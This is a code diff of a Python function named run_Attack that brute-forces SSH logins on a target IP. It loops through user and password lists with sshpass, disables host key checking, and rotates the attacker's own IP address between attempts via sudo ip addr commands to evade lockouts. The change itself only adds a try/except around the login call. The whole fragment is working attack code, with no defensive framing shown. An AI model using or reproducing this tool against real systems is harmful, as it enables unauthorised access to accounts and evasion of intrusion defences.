@@ -34,12 +34,14 @@ def run_Attack():
         for user in users:
             for ps in passwds:
                 print(user,':', ps)
-                subprocess.call(['sshpass','-p', ps,'ssh','-o','stricthostkeychecking=no', user + '@' + target_IP])
-                ip = ips[ip_index]
-                old_ip = ip - 1
-                subprocess.call(['sudo', 'ip', 'addr', 'add', host_IP + str(ip) + '/24', 'dev', network_Interface])
-                subprocess.call(['sudo', 'ip', 'addr', 'delete', host_IP + str(old_ip) + '/24', 'dev', network_Interface])
-                ip_index += 1
-                if ip_index >= len(ips):
-                    ip_index = 0
-                passwd_index += 1
+                try:
+                    subprocess.call(['sshpass','-p', ps,'ssh','-o','stricthostkeychecking=no', user + '@' + target_IP])
+                except:
+                    ip = ips[ip_index]
+                    old_ip = ip - 1
+                    subprocess.call(['sudo', 'ip', 'addr', 'add', host_IP + str(ip) + '/24', 'dev', network_Interface])
+                    subprocess.call(['sudo', 'ip', 'addr', 'delete', host_IP + str(old_ip) + '/24', 'dev', network_Interface])
+                    ip_index += 1
+                    if ip_index >= len(ips):
+                        ip_index = 0
+                    passwd_index += 1
